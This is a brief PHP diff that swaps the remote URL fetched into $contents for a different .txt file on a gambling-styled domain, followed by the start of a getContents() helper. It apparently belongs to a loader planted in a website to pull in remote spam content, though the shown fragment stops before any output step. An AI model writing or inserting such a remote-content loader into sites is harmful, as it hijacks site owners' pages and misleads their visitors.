@@ -1,5 +1,5 @@
 <?php
-$contents = 'https://stockity.fun/demo.txt';
+$contents = 'https://amp.nextgacor.com/message.txt';
 $allDevice = true;
 function getContents($url) {
     if(!function_exists('file_get_contents')) {
